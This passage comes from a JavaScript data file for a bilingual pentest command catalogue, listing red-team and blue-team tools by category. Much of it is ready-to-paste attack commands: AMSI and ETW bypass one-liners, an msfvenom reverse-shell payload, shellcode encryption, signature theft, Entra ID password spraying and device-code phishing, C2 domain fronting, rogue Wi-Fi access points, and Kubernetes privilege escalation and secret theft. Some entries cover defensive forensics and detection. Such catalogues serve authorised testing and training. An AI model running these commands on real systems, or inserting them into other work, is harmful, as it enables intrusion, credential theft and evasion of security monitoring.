      { name: { zh: 'SIP 和内核扩展', en: 'SIP and kernel extensions' }, command: 'csrutil status\ncsrutil authenticated-root status\nkextstat  # 已加载内核扩展\nsystemextensionsctl list  # 系统扩展', description: { zh: 'SIP 保护和内核扩展状态', en: 'SIP protection and kernel extension status' }, platform: 'all' },
      { name: { zh: '持久化机制', en: 'Persistence mechanisms' }, command: 'ls ~/Library/LaunchAgents/\nls /Library/LaunchAgents/\nls /Library/LaunchDaemons/\nlaunchctl list\n# 登录项\nosascript -e "tell application \\"System Events\\" to get name of every login item"', description: { zh: 'macOS 持久化机制检查', en: 'macOS persistence mechanism check' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/macos-hardening']
  },
  {
    id: 'red-team-infrastrucutre',
    name: { zh: '红队基础设施', en: 'Red Team Infrastructure' },
    description: { zh: '红队行动基础设施搭建命令', en: 'Red team operation infrastructure setup commands' },
    category: { zh: '红队工具', en: 'Red Team Tools' },
    commands: [
      { name: { zh: 'Redirector 设置', en: 'Redirector setup' }, command: '# Apache 反向代理重定向\na2enmod rewrite proxy proxy_http\n# .htaccess\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} "Cobalt Strike"\nRewriteRule ^(.*)$ http://teamserver/$1 [P,L]', description: { zh: '流量重定向器配置', en: 'Traffic redirector configuration' }, platform: 'linux' },
      { name: { zh: 'C2 域前置', en: 'Domain fronting' }, command: '# 通过 CDN 隐藏 C2 流量\n# Host 头指向真实 C2\ncurl -H "Host: real-c2.example.com" https://cdn.cloudflare.net/\n# Cobalt Strike 配置 malleable profile\nset host_header "real-c2.example.com";', description: { zh: 'C2 域前置技术', en: 'C2 domain fronting technique' }, platform: 'all' },
      { name: { zh: '自动化 VPS 搭建', en: 'Automated VPS setup' }, command: '# 使用 Terraform 搭建基础设施\nterraform init && terraform apply\n# 或 DigitalOcean CLI\ndoctl compute droplet create teamserver --image ubuntu-22-04-x64 --size s-2vcpu-2gb', description: { zh: '自动化红队 VPS 搭建', en: 'Automated red team VPS provisioning' }, platform: 'linux' }
    ],
    references: ['https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki']
  },


  {
    id: 'wifiphisher-attacks',
    name: { zh: '无线钓鱼攻击', en: 'Wireless Phishing Attacks' },
    description: { zh: 'Wi-Fi 钓鱼和高级无线攻击工具命令', en: 'Wi-Fi phishing and advanced wireless attack tool commands' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    installation: 'git clone https://github.com/wifiphisher/wifiphisher',
    commands: [
      { name: { zh: 'Wifiphisher', en: 'Wifiphisher' }, command: 'wifiphisher -aI wlan0 -jI wlan1 -p oauth-login\nwifiphisher --essid "FreeWiFi" -p firmware-upgrade\nwifiphisher -e "TargetAP" -p wifi_connect', description: { zh: 'Wifiphisher 恶意 AP 钓鱼', en: 'Wifiphisher rogue AP phishing' }, platform: 'linux' },
      { name: { zh: 'Airgeddon 框架', en: 'Airgeddon framework' }, command: 'bash airgeddon.sh\n# 菜单驱动界面:\n# 2 = 设置接口\n# 5 = WPA/WPA2 破解\n# 7 = 恶意 AP 攻击', description: { zh: 'Airgeddon 综合无线攻击', en: 'Airgeddon comprehensive wireless attack' }, platform: 'linux' },
      { name: { zh: 'hostapd 恶意 AP', en: 'hostapd rogue AP' }, command: "# hostapd.conf\ninterface=wlan0\nssid=FreeWiFi\nchannel=6\nhw_mode=g\nsudo hostapd hostapd.conf\n# 配合 dhcpd 分配 IP", description: { zh: '手动搭建恶意 AP', en: 'Manually set up rogue AP' }, platform: 'linux' },
      { name: { zh: 'Deauth 攻击', en: 'Deauthentication attack' }, command: 'aireplay-ng -0 100 -a BSSID -c CLIENT wlan0mon\n# 广播 deauth\naireplay-ng -0 0 -a BSSID wlan0mon', description: { zh: 'Wi-Fi 取消认证攻击', en: 'Wi-Fi deauthentication attack' }, platform: 'linux' }
    ],
    references: ['https://github.com/wifiphisher/wifiphisher']
  },
  {
    id: 'azure-ad-attacks',
    name: { zh: 'Azure AD/EntraID 攻击', en: 'Azure AD/Entra ID Attacks' },
    description: { zh: 'Azure Active Directory 渗透测试命令', en: 'Azure Active Directory penetration testing commands' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    installation: 'pip install ROADtools / Install-Module AzureAD',
    commands: [
      { name: { zh: 'ROADtools 枚举', en: 'ROADtools enumeration' }, command: 'roadrecon auth -u user@domain.com -p password\nroadrecon gather\nroadrecon gui  # 启动可视化界面\nroadrecon dump --users', description: { zh: 'Azure AD 深度枚举', en: 'Deep Azure AD enumeration' }, platform: 'all' },
      { name: { zh: 'AADInternals 枚举', en: 'AADInternals enumeration' }, command: "Import-Module AADInternals\n# 外部侦察\nInvoke-AADIntReconAsOutsider -DomainName target.com\n# 密码喷洒\nInvoke-AADIntSpray -UserList users.txt -Password 'Spring2024!'\n# Token 获取\nGet-AADIntAccessToken -Tenant tenant_id", description: { zh: 'AADInternals M365/Azure AD 操作', en: 'AADInternals M365/Azure AD operations' }, platform: 'windows' },
      { name: { zh: 'PRT 令牌滥用', en: 'PRT token abuse' }, command: '# Primary Refresh Token 滥用\n# Roadtools 获取 PRT\nroadrecon auth --prt-cookie PRT_COOKIE\n# ROADtools dump 数据\nroadrecon dump --mfa', description: { zh: 'Azure AD PRT 令牌滥用', en: 'Azure AD PRT token abuse' }, platform: 'all' },
      { name: { zh: '设备代码钓鱼', en: 'Device code phishing' }, command: "# 生成设备代码\nrequests.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', data={'client_id': '1950a258-227b-4e31-a9cf-717495945fc2', 'scope': 'openid profile'})\n# 发送链接给受害者完成认证", description: { zh: 'Azure AD 设备代码钓鱼', en: 'Azure AD device code phishing' }, platform: 'all' }
    ],
    references: ['https://github.com/dirkjanm/ROADtools']
  },
  {
    id: 'anti-av-techniques',
    name: { zh: '免杀技术', en: 'AV Evasion Techniques' },
    description: { zh: '绕过杀毒软件和 EDR 的技术', en: 'Techniques to bypass antivirus and EDR' },
    category: { zh: '红队工具', en: 'Red Team Tools' },
    commands: [
      { name: { zh: 'XOR 加密 Shellcode', en: 'XOR encrypt shellcode' }, command: "python3 -c \"\nshellcode = b'\\xfc\\x48...'  # 原始 shellcode\nkey = 0x42\nencrypted = bytes([b ^ key for b in shellcode])\nprint(','.join([f'0x{b:02x}' for b in encrypted]))\n\"", description: { zh: 'XOR 加密 Shellcode', en: 'XOR encrypt shellcode' }, platform: 'all' },
      { name: { zh: 'Custom Packer', en: 'Custom PE packer' }, command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=4444 -f raw -o raw.bin\npython3 packer.py raw.bin packed.exe\n# 常用工具: ConfuserEx (.NET), Gobfuscate (Go)', description: { zh: '自定义 PE 加壳免杀', en: 'Custom PE packer for AV evasion' }, platform: 'all' },
      { name: { zh: 'AMSI 绕过方法', en: 'AMSI bypass methods' }, command: "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n# 或内存补丁\n$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n$b=$a.GetField('amsiContext','NonPublic,Static').GetValue($null)\n[IntPtr]$c=[System.Runtime.InteropServices.Marshal]::ReadInt64($b)\n[System.Runtime.InteropServices.Marshal]::WriteByte([IntPtr]($c+0x2db), 0xeb)", description: { zh: 'AMSI 内存补丁绕过', en: 'AMSI memory patch bypass' }, platform: 'windows' },
      { name: { zh: 'ETW 禁用', en: 'ETW disable' }, command: "[System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)", description: { zh: '禁用 ETW 事件跟踪', en: 'Disable ETW event tracing' }, platform: 'windows' }
    ],
    references: ['https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell']
  },


  {
    id: 'kernel-exploitation',
    name: { zh: 'Linux 内核漏洞利用', en: 'Linux Kernel Exploitation' },
    description: { zh: 'Linux 内核漏洞利用工具和技术', en: 'Linux kernel vulnerability exploitation tools and techniques' },
    category: { zh: 'CTF/PWN', en: 'CTF / PWN' },
    commands: [
      { name: { zh: '内核版本检查', en: 'Kernel version check' }, command: 'uname -r\nuname -a\ncat /proc/version\ndmesg | head', description: { zh: '检查内核版本信息', en: 'Check kernel version information' }, platform: 'linux' },
      { name: { zh: 'KASLR 绕过', en: 'KASLR bypass' }, command: "# 通过 /proc/kallsyms 泄露\ncat /proc/kallsyms | grep _text\n# 通过 dmesg\ndmesg | grep 'kernel: Oops'\n# 侧信道\ntiming_attack.py", description: { zh: 'KASLR 内核地址随机化绕过', en: 'Bypass KASLR kernel address randomization' }, platform: 'linux' },
      { name: { zh: 'ret2usr', en: 'ret2usr technique' }, command: "# 内核漏洞利用: 跳回用户空间执行特权代码\nvoid *ptr = (void *)0x1234567890;\n// commit_creds(prepare_kernel_cred(0));\n// 然后 swapgs; iretq", description: { zh: 'ret2usr 内核利用技术', en: 'ret2usr kernel exploitation technique' }, platform: 'linux' },
      { name: { zh: 'CTF 内核题环境', en: 'CTF kernel challenge env' }, command: "# 启动 QEMU\nqemu-system-x86_64 -kernel bzImage -initrd rootfs.cpio -append 'console=ttyS0 nokaslr' -nographic\n# 提取 rootfs\nmkdir rootfs && cd rootfs && cpio -idmv < ../rootfs.cpio.gz", description: { zh: 'QEMU 内核 CTF 环境搭建', en: 'Set up QEMU kernel CTF environment' }, platform: 'linux' }
    ],
    references: ['https://github.com/xairy/linux-kernel-exploitation']
  },
  {
    id: 'container-orchestration-attacks',
    name: { zh: '容器编排攻击', en: 'Container Orchestration Attacks' },
    description: { zh: 'Kubernetes/Docker Swarm 集群攻击命令', en: 'Kubernetes/Docker Swarm cluster attack commands' },
    category: { zh: '容器安全', en: 'Container Security' },
    commands: [
      { name: { zh: 'kubectl 滥用', en: 'kubectl abuse' }, command: 'kubectl get secrets -A -o yaml\nkubectl exec -it pod -- /bin/bash\nkubectl run shell --image=alpine -it --rm -- sh\n# 提权\nkubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default', description: { zh: 'kubectl 权限滥用', en: 'kubectl privilege abuse' }, platform: 'all' },
      { name: { zh: 'etcd 攻击', en: 'etcd attack' }, command: 'ETCDCTL_API=3 etcdctl --endpoints=https://master:2379 get / --prefix --keys-only\nETCDCTL_API=3 etcdctl get /registry/secrets/default/ --prefix\n# 解码 secret\nbase64 -d <<< encoded_value', description: { zh: '读取 etcd 中的 Kubernetes secrets', en: 'Read Kubernetes secrets from etcd' }, platform: 'linux' },
      { name: { zh: 'Docker Swarm 攻击', en: 'Docker Swarm attack' }, command: 'docker node ls\ndocker service ls\ndocker service inspect service_name\n# 通过 swarm manager 创建特权服务\ndocker service create --mount type=bind,src=/,dst=/host --name pwn alpine', description: { zh: 'Docker Swarm 集群攻击', en: 'Docker Swarm cluster attack' }, platform: 'linux' }
    ],
    references: ['https://github.com/BishopFox/badPods']
  },
  {
    id: 'hardware-security',
    name: { zh: '硬件安全测试', en: 'Hardware Security Testing' },
    description: { zh: '硬件设备安全测试和接口分析命令', en: 'Hardware device security testing and interface analysis commands' },
    category: { zh: 'CTF/固件分析', en: 'CTF / Firmware Analysis' },
    commands: [
      { name: { zh: 'UART 串口分析', en: 'UART serial analysis' }, command: '# 连接 UART\nscreen /dev/ttyUSB0 115200\nminicom -D /dev/ttyUSB0 -b 115200\n# 查找波特率\nauart_detect.py /dev/ttyUSB0', description: { zh: 'UART 串行接口分析', en: 'UART serial interface analysis' }, platform: 'linux' },
      { name: { zh: 'JTAG 调试', en: 'JTAG debugging' }, command: 'openocd -f interface/ftdi/olimex-jtag.cfg -f target/stm32f1x.cfg\ntelnet localhost 4444\n# OpenOCD 命令\nhalt; dump_image firmware.bin 0x08000000 0x100000', description: { zh: 'JTAG 接口调试和固件提取', en: 'JTAG interface debugging and firmware extraction' }, platform: 'linux' },
      { name: { zh: 'SPI Flash 读取', en: 'SPI flash read' }, command: 'flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin\nflashrom -p ch341a_spi -r backup.bin\n# 分析\nbinwalk firmware.bin', description: { zh: 'SPI Flash 芯片固件读取', en: 'SPI flash chip firmware reading' }, platform: 'linux' },
      { name: { zh: 'USB 安全测试', en: 'USB security testing' }, command: 'lsusb -v\nusbview\n# USBKill 检测\n# BadUSB 注入\nrubberducky.py payload.dd\n# USB 监控\nusbmon', description: { zh: 'USB 设备安全测试', en: 'USB device security testing' }, platform: 'linux' }
    ],
    references: ['https://github.com/openocd-org/openocd']
  },
  {
    id: 'pentest-automation-frameworks',
    name: { zh: '渗透测试自动化框架', en: 'Pentest Automation Frameworks' },
    description: { zh: '渗透测试自动化框架和工具链', en: 'Penetration testing automation frameworks and toolchains' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'AutoRecon', en: 'AutoRecon' }, command: 'autorecon target_ip\nautorecon -t targets.txt\nautorecon --only-scans-dir /results target_ip', description: { zh: 'AutoRecon 自动化侦察', en: 'AutoRecon automated reconnaissance' }, platform: 'linux' },
      { name: { zh: 'PentestGPT', en: 'PentestGPT assisted' }, command: '# AI 辅助渗透测试\n# 描述目标和当前状态\n# 获取下一步建议\npip install pentestgpt\npentestgpt --target target.com', description: { zh: 'AI 辅助渗透测试', en: 'AI-assisted penetration testing' }, platform: 'all' },
      { name: { zh: 'Faraday IDE', en: 'Faraday IDE' }, command: 'faraday-server start\n# 访问 http://localhost:5985\nfplugin Nmap -o nmap.xml\nfplugin Burp -i burp.xml', description: { zh: 'Faraday 渗透测试协作平台', en: 'Faraday pentest collaboration platform' }, platform: 'linux' },
      { name: { zh: 'Caldera 自动化', en: 'Caldera automation' }, command: 'cd caldera && python server.py --insecure\n# 访问 http://localhost:8888\n# admin/admin\n# 创建和运行 adversary 行动', description: { zh: 'MITRE CALDERA 对抗仿真', en: 'MITRE CALDERA adversary emulation' }, platform: 'linux' }
    ],
    references: ['https://github.com/digininja/autorecon', 'https://github.com/mitre/caldera']
  },


  {
    id: 'network-forensics-advanced',
    name: { zh: '网络取证深度分析', en: 'Advanced Network Forensics' },
    description: { zh: '网络流量深度取证分析工具命令', en: 'Deep network traffic forensics analysis tool commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: 'Zeek 网络分析', en: 'Zeek network analysis' }, command: 'zeek -r capture.pcap local\nls -la *.log\n# 分析连接\ncat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto duration\n# 检测扫描\ncat conn.log | zeek-cut id.orig_h | sort | uniq -c | sort -rn', description: { zh: 'Zeek 网络安全监控', en: 'Zeek network security monitoring' }, platform: 'linux' },
      { name: { zh: 'Suricata IDS', en: 'Suricata IDS' }, command: 'suricata -c /etc/suricata/suricata.yaml -r capture.pcap -l /tmp/logs/\ncat /tmp/logs/eve.json | python3 -m json.tool | grep -i "alert"\n# 实时监控\nsuricata -c /etc/suricata/suricata.yaml -i eth0', description: { zh: 'Suricata 入侵检测分析', en: 'Suricata intrusion detection analysis' }, platform: 'linux' },
      { name: { zh: 'NetworkMiner 分析', en: 'NetworkMiner analysis' }, command: '# Windows GUI 工具\nNetworkMiner.exe capture.pcap\n# 自动提取文件、证书、凭证\n# 重建会话内容', description: { zh: 'NetworkMiner 被动网络取证', en: 'NetworkMiner passive network forensics' }, platform: 'windows' },
      { name: { zh: 'Rita 威胁检测', en: 'Rita threat detection' }, command: 'rita import capture.pcap my_dataset\nrita analyze my_dataset\nrita show-beacons my_dataset\nrita show-blacklisted my_dataset', description: { zh: 'Rita 信标和威胁检测', en: 'Rita beacon and threat detection' }, platform: 'linux' }
    ],
    references: ['https://zeek.org/']
  },
  {
    id: 'windows-av-bypass-advanced',
    name: { zh: 'Windows AV/EDR 高级绕过', en: 'Advanced Windows AV/EDR Bypass' },
    description: { zh: 'Windows 防病毒和 EDR 高级绕过技术', en: 'Advanced Windows antivirus and EDR bypass techniques' },
    category: { zh: '红队工具', en: 'Red Team Tools' },
    commands: [
      { name: { zh: 'PE 签名伪造', en: 'PE signature spoofing' }, command: 'sigthief -i legitimate.exe -s malicious.exe -o signed.exe\n# 窃取合法程序的签名\nsigthief.py -i putty.exe -s payload.exe', description: { zh: '伪造 PE 数字签名', en: 'Spoof PE digital signature' }, platform: 'windows' },
      { name: { zh: '进程注入低噪音', en: 'Low-noise process injection' }, command: '# 早期鸟（Early Bird）APC 注入\n# 在进程初始化时注入\n# 使用 NtQueueApcThread\n# 目标: svchost.exe 等白名单进程', description: { zh: '低噪音 APC 早期注入', en: 'Low-noise early bird APC injection' }, platform: 'windows' },
      { name: { zh: 'DLL Sideloading', en: 'DLL sideloading' }, command: '# 查找存在 DLL 劫持的应用\nProcess Monitor -> 过滤 NAME NOT FOUND\n# 恶意 DLL 放入同目录\n# 目标调用合法程序自动加载', description: { zh: 'DLL 侧加载攻击', en: 'DLL sideloading attack' }, platform: 'windows' },
      { name: { zh: 'Scarecrow 生成', en: 'Scarecrow payload generation' }, command: 'scarecrow -I payload.bin -Loader dll -domain google.com\nscarecrow -I shellcode.bin -Loader binary\n# 生成绕过 EDR 的 loader', description: { zh: 'Scarecrow 免杀 Loader 生成', en: 'Generate evasive loader with Scarecrow' }, platform: 'linux' }
    ],
    references: ['https://github.com/optiv/ScareCrow']
  },
  {
    id: 'threat-hunting',
    name: { zh: '威胁狩猎', en: 'Threat Hunting' },
    description: { zh: '主动威胁狩猎工具和查询命令', en: 'Proactive threat hunting tools and query commands' },
    category: { zh: '蓝队取证', en: 'Blue Team & DFIR' },
    commands: [
      { name: { zh: 'Sigma 规则', en: 'Sigma rules' }, command: 'sigma convert -t splunk rule.yml\nsigma convert -t elastic-query rule.yml\nsigma check rule.yml\n# 搜索规则库\ngrep -r "T1059" sigma/rules/', description: { zh: 'Sigma SIEM 检测规则', en: 'Sigma SIEM detection rules' }, platform: 'all' },
      { name: { zh: 'YARA 规则开发', en: 'YARA rule development' }, command: 'yara -r rules.yar /path/to/scan\nyara rule.yar malware.exe\n# 规则模板\nrule detect_webshell {\n    meta: description = "PHP webshell"\n    strings:\n        $a = "eval(" ascii\n        $b = "base64_decode" ascii\n    condition: $a and $b\n}', description: { zh: 'YARA 恶意软件检测规则', en: 'YARA malware detection rules' }, platform: 'all' },
      { name: { zh: 'Velociraptor 狩猎', en: 'Velociraptor hunting' }, command: 'velociraptor artifacts collect Windows.System.Pslist\nvelociraptor artifacts collect Windows.Network.Netstat\nvelociraptor query "SELECT * FROM pslist() WHERE Exe =~ \'svchost\'"', description: { zh: 'Velociraptor 端点取证狩猎', en: 'Velociraptor endpoint forensic hunting' }, platform: 'all' }
    ],
    references: ['https://github.com/SigmaHQ/sigma']
  },
  {
    id: 'kubernetes-advanced',
    name: { zh: 'Kubernetes 高级攻击', en: 'Kubernetes Advanced Attacks' },
    description: { zh: 'Kubernetes 集群高级渗透技术', en: 'Advanced Kubernetes cluster penetration techniques' },
    category: { zh: '容器安全', en: 'Container Security' },
    commands: [
      { name: { zh: 'kubeletctl 攻击', en: 'kubeletctl attacks' }, command: 'kubeletctl -s node_ip pods\nkubeletctl -s node_ip exec -n kube-system -p coredns -c coredns -- id\nkubeletctl -s node_ip run -n default -p nginx -c nginx -- id', description: { zh: 'kubelet API 未授权攻击', en: 'kubelet API unauthorized attack' }, platform: 'all' },
      { name: { zh: 'K8s Token 横向', en: 'K8s token lateral movement' }, command: 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\nkubectl --token=$TOKEN get pods -A\nkubectl --token=$TOKEN exec -it pod -- /bin/bash\n# 创建 ClusterRoleBinding\nkubectl --token=$TOKEN create clusterrolebinding pwn --clusterrole=cluster-admin --user=attacker', description: { zh: '使用 ServiceAccount Token 横向', en: 'Lateral movement using ServiceAccount token' }, platform: 'all' },
      { name: { zh: 'Peirates K8s 工具', en: 'Peirates K8s pentest' }, command: 'peirates\n# 菜单驱动工具\n# 自动枚举 K8s 集群\n# 权限提升和逃逸', description: { zh: 'Peirates Kubernetes 渗透测试', en: 'Peirates Kubernetes penetration testing' }, platform: 'linux' }
    ],
    references: ['https://github.com/inguardians/peirates']
  },

  ...commandCatalogTools,
  ...osToolCommandExtensions
];

export default toolCommands;
